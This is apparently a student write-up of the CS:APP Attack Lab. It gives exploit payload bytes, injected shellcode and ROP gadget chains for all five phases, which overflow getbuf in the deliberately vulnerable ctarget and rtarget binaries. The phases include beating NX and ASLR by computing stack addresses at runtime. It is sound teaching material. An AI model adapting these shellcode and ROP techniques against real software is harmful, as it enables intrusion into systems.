---
title: Attack Lab
description: Stack buffer overflows — from code injection to a ROP chain that beats NX and ASLR.
---

# Attack Lab · Hijacking Control Flow

<p class="article-meta">Software security <span class="dot">·</span> Keywords: buffer overflow, code injection, ROP <span class="dot">·</span> <a href="https://github.com/LeeXSean/csapp-labs/tree/main/Attack_Lab">Source</a></p>

!!! success "Verified locally"
    All **5 phases pass**: `hex2raw < phaseN.txt | ./ctarget -q` (1-3) and `./rtarget -q` (4-5) each report *"Valid solution"*.

Two binaries, one bug: a function reads unbounded input into a fixed stack buffer. The task is to craft that input so that when the function returns, control lands **where we choose**. Phases 1-3 attack `ctarget` by injecting code; phases 4-5 attack `rtarget`, where NX and stack randomization force a subtler technique.

!!! abstract "The setup"
    The vulnerable routine is `getbuf`, which reads into a **40-byte** buffer with no bounds check and then returns:

    ``` c
    unsigned getbuf() {
        char buf[BUFFER_SIZE];   // 40 bytes
        Gets(buf);               // overflowable
        return 1;
    }
    ```

    Source: <a href="https://github.com/LeeXSean/csapp-labs/tree/main/Attack_Lab/target1"><code>ctarget</code> · getbuf @ 4017a8–4017bd</a>
    {: .code-source }

    The sketch is `ctarget`'s `getbuf` at `0x4017a8`: `sub $0x28,%rsp` carves out the frame, `mov %rsp,%rdi` hands the buffer to `Gets`, and the function returns `1`. In GDB the entry `%rsp` is `0x5561dca0`, the word holding the saved return address, so the buffer begins `0x28` bytes lower at `0x5561dc78`.

    So bytes 0-39 fill the buffer and bytes 40-47 overwrite the **saved return address**. For this target instance: the buffer sits at `0x5561dc78`, the cookie is `0x59b997fa`, and the targets are `touch1 = 0x4017c0`, `touch2 = 0x4017ec`, `touch3 = 0x4018fa`.

``` text
     high addresses
    +----------------------------+
    |  saved return address      |  <- bytes 40-47: what we overwrite
    +----------------------------+  <- 0x5561dca0
    |                            |
    |   buf[40]  (bytes 0-39)    |
    |                            |
    +----------------------------+  <- 0x5561dc78  buf / %rsp
     low addresses
```

<p class="code-source">Source: <a href="https://github.com/LeeXSean/csapp-labs/tree/main/Attack_Lab/target1"><code>ctarget</code> · getbuf frame @ 4017a8–4017bd</a> (reformatted to fit)</p>

---

## Phase 1 · just change the return address { data-toc-label="Phase 1" }

The simplest attack. `touch1` takes no argument — we only need `getbuf` to "return" into it. Fill 40 bytes of padding, then overwrite the return address with `touch1`:

``` text
bytes 0-39 : 90 x 40                     (padding)
bytes 40-47: c0 17 40 00 00 00 00 00     (-> 0x4017c0 = touch1)
```

<p class="code-source">Source: <a href="https://github.com/LeeXSean/csapp-labs/blob/main/Attack_Lab/target1/phase1.txt#L1-L6"><code>phase1.txt</code> L1–L6</a></p>

## Phase 2 · inject code to set the cookie { data-toc-label="Phase 2" }

`touch2` demands that its argument (`%rdi`) equal the cookie. Since the stack is executable in `ctarget`, we place a few instructions **in the buffer**, return into them, and let them set `%rdi` and jump onward:

``` asm
movl $0x59b997fa, %edi     ; the cookie into the first-argument register
push $0x4017ec             ; push touch2's address
ret                        ; "return" into touch2
```

<p class="code-source">Source: <a href="https://github.com/LeeXSean/csapp-labs/blob/main/Attack_Lab/target1/phase2.s#L1-L3"><code>phase2.s</code> L1–L3</a></p>

Assembled, that's `bf fa 97 b9 59 68 ec 17 40 00 c3`. Lay it at the buffer start, pad, and set the return address to the **buffer itself** (`0x5561dc78`) so `getbuf` returns straight into our code:

``` text
bytes 0-10 : bf fa 97 b9 59 68 ec 17 40 00 c3   (the shellcode above)
bytes 11-39: 90 ...                                (padding)
bytes 40-47: 78 dc 61 55 00 00 00 00             (-> 0x5561dc78 = buffer)
```

<p class="code-source">Source: <a href="https://github.com/LeeXSean/csapp-labs/blob/main/Attack_Lab/target1/phase2.txt#L1-L6"><code>phase2.txt</code> L1–L6</a></p>

## Phase 3 · pass a string to touch3 { data-toc-label="Phase 3" }

`touch3` wants `%rdi` to point at the **ASCII** cookie, `"59b997fa"`. The string cannot stay inside the old `getbuf` buffer: `touch3` calls `hexmatch`, whose stack frame reuses that region. The submitted payload therefore places the string **after the overwritten return address**, at `buffer + 0x30 = 0x5561dca8`, and points `%edi` there.

Because the stack grows downward, `touch3` and `hexmatch` build their frames at lower addresses. The cookie at `buf + 0x30` stays above those writes:

``` asm
movl $0x5561dca8, %edi     ; string at buffer + 0x30
push $0x4018fa             ; touch3
ret
```

<p class="code-source">Source: <a href="https://github.com/LeeXSean/csapp-labs/blob/main/Attack_Lab/target1/phase3.txt#L1-L2"><code>phase3.txt</code> L1–L2</a> (the asm assembles to the first 11 bytes)</p>

``` text
bytes 0-10 : bf a8 dc 61 55 68 fa 18 40 00 c3    (shellcode -> %edi = 0x5561dca8)
bytes 40-47: 78 dc 61 55 ...                        (return into the buffer, runs the code)
bytes 48-56: 35 39 62 39 39 37 66 61 00           ("59b997fa\0" at 0x5561dca8)
```

<p class="code-source">Source: <a href="https://github.com/LeeXSean/csapp-labs/blob/main/Attack_Lab/target1/phase3.txt#L1-L7"><code>phase3.txt</code> L1–L7</a></p>

``` text
   high addresses
     buf+0x30   "59b997fa\0"                 <- %rsp on entry to touch3
   --------------------------------------
     buf+0x28   overwritten return address
     buf+0x00   getbuf's old buffer          <- reused by deeper stack frames
   low addresses
```

<p class="code-source">Source: <a href="https://github.com/LeeXSean/csapp-labs/blob/main/Attack_Lab/target1/phase3.txt#L6-L7"><code>phase3.txt</code> L6–L7</a></p>

This matches `phase3.txt`: the shellcode occupies the start of the buffer, the saved return address points back to that shellcode, and the cookie string **`59b997fa`** follows the return slot where nested calls cannot clobber it.

---

## Turning to rtarget: why injection stops working { data-toc-label="Turning to rtarget" }

`rtarget` closes both doors the first three phases walked through:

- **NX (non-executable stack)** — bytes on the stack can't run, so injected shellcode is dead on arrival.
- **ASLR / stack randomization** — the buffer's address changes each run, so we can't hardcode a jump into it.

The answer is **Return-Oriented Programming**: don't supply *code*, supply a **chain of addresses**. Each points at a short existing snippet ending in `ret` — a *gadget* — and every `ret` pops the next address, threading the gadgets into a program we never wrote.

## Phase 4 · a two-gadget chain { data-toc-label="Phase 4" }

We only need to reproduce phase 2 (put the cookie in `%rdi`, call `touch2`) using gadgets from the farm. Two suffice:

| Address | Gadget bytes | Instruction | Effect |
|---------|--------------|-------------|--------|
| `0x4019cc` | `58 90 c3` | `pop %rax ; nop ; ret` | pop the next stack value into `%rax` |
| `0x4019a2` | `48 89 c7 c3` | `mov %rax,%rdi ; ret` | copy it into the argument register |

The chain lays the cookie *between* the two gadget addresses, so the `pop` scoops it up:

``` text
bytes 40-47: cc 19 40 00 ...     (-> pop %rax)
bytes 48-55: fa 97 b9 59 ...     (the cookie, popped into %rax)
bytes 56-63: a2 19 40 00 ...     (-> mov %rax,%rdi)
bytes 64-71: ec 17 40 00 ...     (-> touch2)
```

<p class="code-source">Source: <a href="https://github.com/LeeXSean/csapp-labs/blob/main/Attack_Lab/target1/phase4.txt#L6-L9"><code>phase4.txt</code> L6–L9</a></p>

## Phase 5 · computing a stack address at runtime { data-toc-label="Phase 5" }

Phase 3's problem returns, now under ASLR: `touch3` needs `%rdi` pointing at the cookie string, but we no longer know any stack address. The way out is to **read `%rsp` at runtime** and add a known offset to it. The string is planted at the very end of the chain, and its distance from a captured `%rsp` is a constant — here `0x48`:

| # | Address | Gadget | Effect |
|---|---------|--------|--------|
| 1 | `0x401a06` | `mov %rsp,%rax ; ret` | `%rax <- %rsp` (a live stack address) |
| 2 | `0x4019a2` | `mov %rax,%rdi ; ret` | `%rdi <- %rsp` (the base) |
| 3 | `0x4019ab` | `pop %rax ; nop ; ret` | `%rax <- 0x48` (the offset, next on the stack) |
| 4 | `0x401a42` | `mov %eax,%edx ; test %al,%al ; ret` | hold the offset in `%edx` |
| 5 | `0x401a34` | `mov %edx,%ecx ; cmp %cl,%cl ; ret` | carry it on to `%ecx` |
| 6 | `0x401a13` | `mov %ecx,%esi ; nop ; nop ; ret` | land it in `%esi`, the register `lea` needs |
| 7 | `0x4019d6` | `lea (%rdi,%rsi,1),%rax ; ret` | `%rax <- base + offset` = string address |
| 8 | `0x4019a2` | `mov %rax,%rdi ; ret` | put it in the argument register |
| — | `0x4018fa` | `touch3` | reads the cookie string at `%rdi` |

Why the register relay in steps 4-6? The farm offers no direct `pop`/`mov` into `%rsi`, so the offset is walked `%eax -> %edx -> %ecx -> %esi` through the gadgets that *do* exist. The offset is exact: gadget 1 captures `%rsp` pointing at the chain's continuation (`buf + 0x30`), and the string is planted `0x48` bytes further along:

``` text
   Deriving the 0x48 offset  (byte offsets from the start of buf):

     0x28   gadget 1: mov %rsp,%rax     getbuf returns into gadget 1
     0x30   gadget 2: mov %rax,%rdi     <- %rsp is HERE when gadget 1 runs,
     0x38   gadget 3: pop %rax             so it captures  buf + 0x30
     0x40   0x48  (the offset)          popped, then relayed into %rsi
      ..    lea (%rdi,%rsi) -> %rax = (buf + 0x30) + 0x48 = buf + 0x78
     0x78   "59b997fa"                  the string sits here

     offset = string(0x78) - captured %rsp(0x30) = 0x48
```

<p class="code-source">Source: <a href="https://github.com/LeeXSean/csapp-labs/blob/main/Attack_Lab/target1/phase5.txt#L1-L16"><code>phase5.txt</code> L1–L16</a></p>

No new code and no fixed addresses: a carefully ordered stack of pointers computes the address the attacker needs.
